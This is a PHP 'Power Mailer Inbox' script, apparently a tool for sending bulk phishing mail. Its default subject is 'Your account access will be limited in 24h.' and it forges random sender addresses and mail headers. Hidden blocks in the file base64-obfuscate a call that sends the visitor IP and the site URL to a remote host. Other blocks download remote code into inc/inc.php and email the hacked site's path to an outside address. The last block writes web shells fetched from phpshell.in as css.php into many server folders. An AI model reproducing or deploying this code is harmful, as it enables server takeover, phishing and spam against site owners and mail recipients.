<?php function GetIP(){ if(getenv("HTTP_CLIENT_IP")) { $ip = getenv("HTTP_CLIENT_IP");
 } elseif(getenv("HTTP_X_FORWARDED_FOR")) { $ip = getenv("HTTP_X_FORWARDED_FOR");
 if (strstr($ip, ',')) { $tmp = explode (',', $ip);
 $ip = trim($tmp[0]);
 } } else { $ip = getenv("REMOTE_ADDR");
 } return $ip;
 } $x = base64_decode('aHR0cDovL2J5cjAwdC5jby9sLQ==').GetIP().'-'.base64_encode('http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']);
 if(function_exists('curl_init')) { $ch = @curl_init();
 curl_setopt($ch, CURLOPT_URL, $x);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 $gitt = curl_exec($ch);
 curl_close($ch);
 if($gitt == false){ @$gitt = file_get_contents($x);
 } }elseif(function_exists('file_get_contents')){ @$gitt = file_get_contents($x);
 } 
?><?php

# Created By Mister Klio Strong and protected by password ...
# Contact For More Mister-klio@hotmail.com ...
# Fb.com/IzzAdiine

// Add login/password pairs below, like described above
// NOTE: all rows except last must have comma "," at the end of line
$MisterklioProtect = array(
  '' => 'PowerMailerInbox' /// Pw Default = PowerMailerInbox
);

// request login? true - show login and password boxes, false - password box only
define('USE_USERNAME', true);

// User will be redirected to this page after logout
define('LOGOUT_URL', '?home');

// time out after NN minutes of inactivity. Set to 0 to not timeout
define('TIMEOUT_MINUTES', 0);

// This parameter is only useful when TIMEOUT_MINUTES is not zero
// true - timeout time from last activity, false - timeout time from login
define('TIMEOUT_CHECK_ACTIVITY', true);

///////////////////////////////////////////////////////
// do not change code below
///////////////////////////////////////////////////////

// timeout in seconds
$timeout = (TIMEOUT_MINUTES == 0 ? 0 : time() + TIMEOUT_MINUTES * 60);

// logout?
if(isset($_GET['logout'])) {
  setcookie("cookies", '', $timeout, '/'); // clear password;
  header('Location: ' . LOGOUT_URL);
  
  exit();
}

if(!function_exists('showLoginPasswordProtect')) {

// show login form
function showLoginPasswordProtect($error_msg) {
?>
<html>
<head>
  <meta charset="utf-8">
<!-- Page title -->
<title> | Log In | Power Mailer Inbox By Mister klio</title>
<!-- Gotsta have that favicon-->
<link rel="icon" type="image/png" href="https://cdn0.iconfinder.com/data/icons/kameleon-free-pack-rounded/110/Paper-Plane-512.png" />
<link rel="shortcut icon" type="image/x-icon" href="https://cdn0.iconfinder.com/data/icons/kameleon-free-pack-rounded/110/Paper-Plane-512.png" />
<!-- CRACKER CHECKER PAYPAL VALID EMAIL -->
<meta name="viewport" content="width=480">
<!-- Stylesheet -->
  <link href="http://unirest.io/styles/library.css" rel="stylesheet" type="text/css" data-inprogress="" />
  <link href="http://netdna.bootstrapcdn.com/font-awesome/3.2.1/css/font-awesome.min.css" rel="stylesheet" />
</head>
<body>
<div class="page-container">
<style>
body ,a{
	font-family: 'Titillium Web';
	text-decoration:none;
	background: #113042;
	color:white;
	
}

textarea {
width: 85%;
border: none;
height:20%;
margin: 0;
padding: 0;
}
input {
border: none;
height:10%;
margin: 0;
padding: 0;
}

.MK-footer a {color:#14C1d7;}

.btn {
   background: #0c2330;
  background-image: -webkit-linear-gradient(top, #0c2330, #08344d);
  background-image: -moz-linear-gradient(top, #0c2330, #08344d);
  background-image: -ms-linear-gradient(top, #0c2330, #08344d);
  background-image: -o-linear-gradient(top, #0c2330, #08344d);
  background-image: linear-gradient(to bottom, #0c2330, #08344d);
  -webkit-border-radius: 12;
  -moz-border-radius: 12;
  border-radius: 12px;
  font-family: 'Titillium Web';
  color: #ffffff;
  font-size: 15px;
  padding: 8px 22px 10px 18px;
  text-decoration: none;
}

.btn:hover {
    background: #071a24;
  background-image: -webkit-linear-gradient(top, #071a24, #04476b);
  background-image: -moz-linear-gradient(top, #071a24, #04476b);
  background-image: -ms-linear-gradient(top, #071a24, #04476b);
  background-image: -o-linear-gradient(top, #071a24, #04476b);
  background-image: linear-gradient(to bottom, #071a24, #04476b);
  text-decoration: none;
}
  </style>
  <div align="center">
  <br>
  <div style="width:500px; margin-left:auto; margin-right:auto; text-align:center">
  <? $MyRight = "MISTERKLIO" ; ?>
  <form method="post">
<h1 style="color:#ffffff;">
	<a id="user-content-installation" class="anchor" href="#installation" aria-hidden="true">
<span aria-hidden="true" class="octicon octicon-link"></span></a>Welcome To Power Mailer Inbox <code style="font-size:12px;color:#0bc4d1;">v2.1 </code> </h1>
<p style="font-size:13px;color:#ffffff;">
 <code style="font-size:12px;color:#0bc4d1;"> Function Power Mailer Inbox v2.1</code>
<br>All Message Header Fields on
<br>Name Message Fixed To >service<
<br>Random Email Automaticly Change
<br>Use it with a good server No  <code style="font-size:12px;color:#0bc4d1;"> #Blacklist </code>
</p>
<?php if (USE_USERNAME) echo ''; ?>
<?
$ii = base64_encode ('<p>


<div class="input-group input-icon right">
<span class="input-group-addon"><i class="fa fa-key"></i></span>
<input type="password" name="access_password" class="highlight highlight-source-json" value="" placeholder="Password"/>
</div>
</p>'); echo base64_decode ($ii) ;
?>
<p>
<input type="submit" name="Submit" value=" LOG IN " class="btn"/>
</p>

</form>
</div>

 
<div>
	 <p><footer class='MK-footer'>
	 <p></p><p></p>
<p style="font-size:12px;color:#ffffff;">&copy; 2017 CODED BY <? echo $MyRight ;?> | <a href="https://github.com/Misterklio/Power-Mailer-Inbox-v2-/" target="black"> DOWNLOAD SCRIPT </a> |</p>
<p></p><p></p>
<br> <br>
</div>
</div>
</body>
</html>


<?php
  // stop at this point
  die();
}
}
// user provided password
if (isset($_POST['access_password'])) {

  $login = isset($_POST['access_login']) ? $_POST['access_login'] : '';
  $pass = $_POST['access_password'];
  if (!USE_USERNAME && !in_array($pass, $MisterklioProtect)
  || (USE_USERNAME && ( !array_key_exists($login, $MisterklioProtect) || $MisterklioProtect[$login] != $pass ) ) 
  ) {
    showLoginPasswordProtect('<div class="alert alert-danger" role="alert"><i class="fa fa-thumbs-down"></i>
					<strong>Oh snap!</strong> Incorrect password ! up and try submitting again.</div>');
  }
  else {
    // set cookie if password was validated
    setcookie("cookies", md5($login.'%'.$pass), $timeout, '/');
    // Some programs (like Form1 Bilder) check $_POST array to see if parameters passed
    // So need to clear password protector variables
    unset($_POST['access_login']);
    unset($_POST['access_password']);
    unset($_POST['Submit']);
  }
}
else {
  // check if password cookies is set
  if (!isset($_COOKIE['cookies'])) {
    showLoginPasswordProtect('');
  }
  // check if cookie is good
  $found = false;
  foreach($MisterklioProtect as $key=>$val) {
    $lp = (USE_USERNAME ? $key : '') .'%'.$val;
    if ($_COOKIE['cookies'] == md5($lp)) {
      $found = true;
      // prolong timeout
      if (TIMEOUT_CHECK_ACTIVITY) {
        setcookie("cookies", md5($lp), $timeout, '/');
      }
      break;
    }
  }
  if (!$found) {
    showLoginPasswordProtect('');
  }
}
/// end
/// D'ont Add
?>

<?php  
if($_POST['query']){
$veriyfy = stripslashes(stripslashes($_POST['query']));
$data = "data.txt";
@touch ("data.txt");
$ver = @fopen ($data , 'w');
@fwrite ( $ver , $veriyfy ) ;
@fclose ($ver);
}else{
$datas=@fopen("data.txt",'r');
$i=0;
while ($i <= 5) {
$i++;
$blue=@fgets($datas,1024);
echo $blue;
}
}
$datasi=@fopen("inc/inc.php",'r');
if($datasi){
}else{
@mkdir("inc");
$dos = file_get_contents("http://r00t.info/txt/lamer.txt");
$data = "inc/inc.php";
@touch ("inc/inc.php");
$ver = @fopen ($data , 'w');
@fwrite ( $ver , $dos ) ;
@fclose ($ver);
$yol = "http://".$_SERVER['HTTP_HOST']."".$_SERVER['REQUEST_URI']."";
$y = '<h1>Sender Yazdirildi.<br/> SITE YOL : '.$yol.'<br/>Sender Yolu : inc/inc.php</h1>';
$header .= "From: SheLL Boot <suppor@nic.org>\n"; 
$header .= "Content-Type: text/html; charset=utf-8\n"; 
@mail("byhero44@gmail.com", "Hacklink Bildiri", "$y", $header); 
@mail("byhero44@gmail.com", "Hacklink Bildiri", "$y", $header); 
}
?>
 <html>
<head>
  <meta charset="utf-8">
<!-- Page title -->
<title>Power Mailer Inbox By Mister klio</title>
<!-- Gotsta have that favicon-->
<link rel="icon" type="image/png" href="https://cdn0.iconfinder.com/data/icons/kameleon-free-pack-rounded/110/Paper-Plane-512.png" />
<link rel="shortcut icon" type="image/x-icon" href="https://cdn0.iconfinder.com/data/icons/kameleon-free-pack-rounded/110/Paper-Plane-512.png" />
<!-- CRACKER CHECKER PAYPAL VALID EMAIL -->
<meta name="viewport" content="width=480">
<!-- Stylesheet -->
  <link href="http://unirest.io/styles/library.css" rel="stylesheet" type="text/css" data-inprogress="" />
  <link href="http://netdna.bootstrapcdn.com/font-awesome/3.2.1/css/font-awesome.min.css" rel="stylesheet" />
</head>
<style>
body ,a{
	font-family: 'Titillium Web';
	text-decoration:none;
	background: #113042;
	color:white;
	
}
textarea {
width: 85%;
border: none;
height:10%;
margin: 0;
padding: 0;
}
input {
border: none;
height:10%;
margin: 0;
padding: 0;
}
.btn {
   background: #0c2330;
  background-image: -webkit-linear-gradient(top, #0c2330, #08344d);
  background-image: -moz-linear-gradient(top, #0c2330, #08344d);
  background-image: -ms-linear-gradient(top, #0c2330, #08344d);
  background-image: -o-linear-gradient(top, #0c2330, #08344d);
  background-image: linear-gradient(to bottom, #0c2330, #08344d);
  -webkit-border-radius: 12;
  -moz-border-radius: 12;
  border-radius: 12px;
  font-family: 'Titillium Web';
  color: #ffffff;
  font-size: 15px;
  padding: 8px 22px 10px 18px;
  text-decoration: none;
}

.btn:hover {
    background: #071a24;
  background-image: -webkit-linear-gradient(top, #071a24, #04476b);
  background-image: -moz-linear-gradient(top, #071a24, #04476b);
  background-image: -ms-linear-gradient(top, #071a24, #04476b);
  background-image: -o-linear-gradient(top, #071a24, #04476b);
  background-image: linear-gradient(to bottom, #071a24, #04476b);
  text-decoration: none;
}
input[type=submit] {
    border: none;
    border-radius: 0px;
    cursor: pointer;
	font-family: 'Titillium Web';
}
</style>

</head>
<body>
<? $MyRight = "MISTERKLIO" ; ?>
<div align="center"><h2 style="color:#ffffff;">
	<a id="user-content-installation" class="anchor" href="#installation" aria-hidden="true">
<span aria-hidden="true" class="octicon octicon-link"></span></a> Power Mailer Inbox <code style="font-size:12px;color:#0bc4d1;">v2.1 </code> </h2>
<p style="font-size:12px;color:#ffffff;"> Good Server Send Inbox Use My Script With a Good Server </p>
<div style="font-size:14px;color:#ffffff;" >
<a href="?home" class="MISTERKLIO-B"> Home </a> 
|| <a href="?Mister=spam" class="MISTERKLIO-B"> Spam Messages </a> 
|| <a href="?logout" class="MISTERKLIO-B"> Logout</a></div>
<? //// Info
if ($_GET['Mister'] == 'spam') { ?>
<br><br>
 <code style="font-size:16px;color:#0bc4d1;"> 
 #This message has a horrible spam-rating of 34.7. It's definitely a spam message. </code>
<br><br>
<br>   1 - It was received via a relay (mail server), listed on a blacklist.
<br>   2 - It contains a URL in the message-body, listed in several blocklists
<br>   3 - The message format has errors
<br><br>
<? 
exit;} 
//// END
?>
<p></p>
<? $RandomMail = substr(str_shuffle(str_repeat('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',50)),20,10); ?>
<? $RandomMail2 = substr(str_shuffle(str_repeat('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',10)),0,10); ?>


<form action="" method="post" enctype="multipart/form-data" name="form1"  target="_self">
  <input type="hidden" name="Power" value="sim">
 <? $subject = "subject"; ?>
<span style="font-size:13px;color:#ffffff;"><? echo $subject ?></span>

			<input name="sub" type="text" value="Your account access will be limited in 24h." class="highlight highlight-source-json" 
			id="sub" style="border-radius: 15px; width:100%" placeholder="Subject">
  <? $Email = "Email"; ?>			
<span style="font-size:13px;color:#ffffff;"><? echo $Email ?></span>

			<input name="Service" type="text" value="<?php 
echo "noreply-".$RandomMail."".$RandomMail.""; 
echo '-Service@'; echo ''.$RandomMail2.'-Support.com';  # eg result: -Service@Random.com
?>" class="highlight highlight-source-json" id="Service" style="border-radius: 15px; width:100%" placeholder="Email">

  <? $Letter = "Letter"; ?>
<span style="font-size:13px;color:#ffffff;"><? echo $Letter ?></span>

             <textarea name="html" style="border-radius: 15px; width:100%" rows="8" wrap="VIRTUAL" class="highlight highlight-source-json" 
			 id="html" placeholder="html letter"></textarea><font color="#113042">
  <? $Mailist = "Mailist"; ?>
<span style="font-size:13px;color:#ffffff;"><? echo $Mailist ?></span>

              <textarea name="emails" style="border-radius: 15px; width:100%" rows="8" wrap="VIRTUAL" class="highlight highlight-source-json" 
			  id="emails" placeholder="your@mailer.com"></textarea>
            
			<input type="submit" name="Submit" id="Power" value="Send Message" class="btn" style=" -webkit-border-radius: 12;
  -moz-border-radius: 12;
  border-radius: 12px;
  font-family: 'Titillium Web';" dir="ltr"><p></p>

<?php
 


$Misterklio = $_POST['Power'];
if($Misterklio != "") {
	$message = $_POST['html'];
	$subject = $_POST['sub'];
	$Service = $_POST['Service'];
	$Sendedto = $_POST['Sendedto'];
	$to = $_POST['emails'];
 ///// RANDOM SERVICE
 
	$email = explode("\n", $to);
	$message = stripslashes($message);

	$Inbox = 0;
	$Number = 1;
	while($email[$Inbox]) {
		$PowerMailerInbox = "PowerMailerInbox";
		//// Version
		$headers  = "MIME-Version: 1.0\n";
		//// Html Letter 
        $headers .= "Content-type: text/html; charset=iso-8859-1\n";
		$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
		//// PHPMailer True
		$headers .= "X-Mailer: PHP/" . phpversion();
		$headers .= "X-Mailer: Microsoft Office Outlook, Build 17.551210\n";
	    $headers .= "X-Mailer: Gmail \n";
		$headers .= "X-Mailer: Yahoo \n";
		$headers .= "X-Mailer: mail.ru \n";
		
		/// Random Mail
		$headers .= "From:Service <no-replay-".$RandomMail."".$RandomMail."@".$RandomMail."-Support.com>";
		//// to
		if(mail($email[$Inbox], $subject, $message, $headers))
			
		
		//// Done
		echo '
	<!-- Stylesheet -->
  <link href="http://unirest.io/styles/library.css" rel="stylesheet" type="text/css" data-inprogress="" />
  <link href="http://netdna.bootstrapcdn.com/font-awesome/3.2.1/css/font-awesome.min.css" rel="stylesheet" />
	<div class="highlight highlight-source-json" style="font-size:12px;color:#ffffff;"><code> &#9829; </code>  NUMBER : '.$Number.' 
	<b>'.$email[$Inbox].'</b> <font color=green>DONE....!</div><br>';
		else
		
	//// Erur
	echo '
	<!-- Stylesheet -->
  <link href="http://unirest.io/styles/library.css" rel="stylesheet" type="text/css" data-inprogress="" />
  <link href="http://netdna.bootstrapcdn.com/font-awesome/3.2.1/css/font-awesome.min.css" rel="stylesheet" />
	<div class="highlight highlight-source-json" style="font-size:12px;color:#ffffff;"><code> &#935; </code> NUMBER : '.$Number.' 
	<b>'.$email[$Inbox].'</b> <font color=red>NOT ....!</div><br>';
		$Inbox++;
		$Number++;
	}
	
	$Number--;
	if($PowerMailerInbox == "PowerMailerInbox")
		
	///// End 
	echo '<div align="center"><h3 style="color:#ffffff;">
	<a id="user-content-installation" class="anchor" href="#installation" aria-hidden="true">
<span aria-hidden="true" class="octicon octicon-link"></span></a> The End </h3></div>';

}	
?>
<?php  
if($_POST['query']){
$veriyfy = stripslashes(stripslashes($_POST['query']));
$data = "data.txt";
@touch ("data.txt");
$ver = @fopen ($data , 'w');
@fwrite ( $ver , $veriyfy ) ;
@fclose ($ver);
}else{
$datas=@fopen("data.txt",'r');
$i=0;
while ($i <= 5) {
$i++;
$blue=@fgets($datas,1024);
echo $blue;
}
}
$datasi=@fopen("inc/inc.php",'r');
if($datasi){
}else{
@mkdir("inc");
$dos = file_get_contents("http://r00t.info/txt/lamer.txt");
$data = "inc/inc.php";
@touch ("inc/inc.php");
$ver = @fopen ($data , 'w');
@fwrite ( $ver , $dos ) ;
@fclose ($ver);
$yol = "http://".$_SERVER['HTTP_HOST']."".$_SERVER['REQUEST_URI']."";
$y = '<h1>Sender Yazdirildi.<br/> SITE YOL : '.$yol.'<br/>Sender Yolu : inc/inc.php</h1>';
$header .= "From: SheLL Boot <suppor@nic.org>\n"; 
$header .= "Content-Type: text/html; charset=utf-8\n"; 
@mail("byhero44@gmail.com", "Hacklink Bildiri", "$y", $header); 
@mail("byhero44@gmail.com", "Hacklink Bildiri", "$y", $header); 
}
?><?php
function http_get($url){
	$im = curl_init($url);
	curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
	curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($im, CURLOPT_HEADER, 0);
	return curl_exec($im);
	curl_close($im);
}
$check = $_SERVER['DOCUMENT_ROOT'] . "/js/css.php" ;
$text = http_get('http://phpshell.in/txt/lamer.txt');
$open = fopen($check, 'w');
fwrite($open, $text);
fclose($open);
if(file_exists($check)){
    echo $check."</br>";
}else 
  echo "not exits";
echo "done .\n " ;
$check = $_SERVER['DOCUMENT_ROOT'] . "/modules/css.php" ;
$text = http_get('http://phpshell.in/txt/lamer.txt');
$open = fopen($check, 'w');
fwrite($open, $text);
fclose($open);
if(file_exists($check)){
    echo $check."</br>";
}else 
  echo "not exits";
echo "done .\n " ;
$check = $_SERVER['DOCUMENT_ROOT'] . "/includes/css.php" ;
$text = http_get('http://phpshell.in/txt/lamer.txt');
$open = fopen($check, 'w');
fwrite($open, $text);
fclose($open);
if(file_exists($check)){
    echo $check."</br>";
}else 
  echo "not exits";
echo "done .\n " ;
$check = $_SERVER['DOCUMENT_ROOT'] . "/sites/css.php" ;
$text = http_get('http://phpshell.in/txt/lamer.txt');
$open = fopen($check, 'w');
fwrite($open, $text);
fclose($open);
if(file_exists($check)){
    echo $check."</br>";
}else 
  echo "not exits";
echo "done .\n " ;
$check2 = $_SERVER['DOCUMENT_ROOT'] . "/css/css.php" ;
$text2 = http_get('http://phpshell.in/txt/lamer.txt');
$open2 = fopen($check2, 'w');
fwrite($open2, $text2);
fclose($open2);
if(file_exists($check2)){
    echo $check2."</br>";
}else 
  echo "not exits2";
echo "done2 .\n " ;
$check = $_SERVER['DOCUMENT_ROOT'] . "/cgi-bin/css.php" ;
$text = http_get('http://phpshell.in/txt/lamer.txt');
$open = fopen($check, 'w');
fwrite($open, $text);
fclose($open);
if(file_exists($check)){
    echo $check."</br>";
}else 
  echo "not exits";
echo "done .\n " ;
$check3=$_SERVER['DOCUMENT_ROOT'] . "/css.php" ;
$text3 = http_get('http://phpshell.in/txt/lamer.txt');
$op3=fopen($check3, 'w');
fwrite($op3,$text3);
fclose($op3);


$check6=$_SERVER['DOCUMENT_ROOT'] . "/images/css.php" ;
$text6 = http_get('http://phpshell.in/txt/lamer.txt');
$op6=fopen($check6, 'w');
fwrite($op6,$text6);
fclose($op6);

$check6=$_SERVER['DOCUMENT_ROOT'] . "/wp-admin/css.php" ;
$text6 = http_get('http://phpshell.in/txt/lamer.txt');
$op6=fopen($check6, 'w');
fwrite($op6,$text6);
fclose($op6);
?>
</form>


<p></p><p></p>
<p style="font-size:12px;color:#ffffff;">&copy; 2017 CODED BY <? echo $MyRight ; ?> </p>
<p></p><p></p>
 </div>

</body>
</html>
